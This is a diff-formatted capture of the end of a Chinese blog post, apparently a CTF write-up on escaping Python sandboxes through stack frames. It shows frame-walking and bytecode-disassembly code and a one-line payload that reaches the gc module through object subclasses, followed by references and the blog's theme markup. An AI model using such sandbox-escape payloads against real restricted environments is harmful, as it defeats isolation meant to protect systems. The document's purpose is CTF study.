+<span class="hljs-built_in">print</span>(sys._current_frames())      <span class="hljs-comment"># 获取所有线程的堆栈帧对象</span>
+<span class="hljs-built_in">print</span>(sys._current_frames()[threading.main_thread().ident]) <span class="hljs-comment">#获取到主线程的堆栈帧对象</span>
+
+
+frame = sys._current_frames()[threading.main_thread().ident]
+
+<span class="hljs-keyword">while</span> frame <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
+	out = io.StringIO()     <span class="hljs-comment"># 内存创建字符串I/O流</span>
+	dis.dis(frame.f_code,file=out)   <span class="hljs-comment"># 将当前堆栈帧所对应的函数的字节码进行反汇编</span>
+	content = out.getvalue()    <span class="hljs-comment">#获取反汇编的结果</span>
+	out.close()
+	<span class="hljs-built_in">print</span>(content)
+	frame = frame.f_back
+</code></pre></div>
+
+<p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429222137005.png" srcset="/img/loading.gif" lazyload alt="image-20240429222137005"></p>
+<h3 id="gc"><a href="#gc" class="headerlink" title="gc"></a>gc</h3><p>L3HCTF那题禁用了gc，但是这题没有，有师傅用这个秒了好像</p>
+<div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">([].__class__.__base__.__subclasses__()</span></span><span class="hljs-selector-attr">[84]</span><span class="hljs-selector-class">.load_module</span>(<span class="hljs-string">&#x27;gc&#x27;</span>)<span class="hljs-selector-class">.get_objects</span>())
+
+#&lt;class <span class="hljs-string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</code></pre></div>
+
+
+
+<p>东西太多了，有点卡</p>
+<p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240430001910400.png" srcset="/img/loading.gif" lazyload alt="image-20240430001910400"></p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a target="_blank" rel="noopener" href="https://chenxi9981.github.io/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">中国海洋大学信息安全竞赛 WP | 晨曦的个人小站 (chenxi9981.github.io)</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13635">https://xz.aliyun.com/t/13635</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/644012082">(14 封私信 &#x2F; 80 条消息) python栈帧逃逸中关于生成器的问题？ - 知乎 (zhihu.com)</a>感觉有点不对</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>python栈帧沙箱逃逸</div>
+      <div>https://zer0peach.github.io/2024/04/29/python栈帧沙箱逃逸/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Zer0peach</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年4月29日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/18/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入">
+                        <span class="hidden-mobile">JNDI注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <a href="https://zer0peach.github.io"><span>author:Zer0peach</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
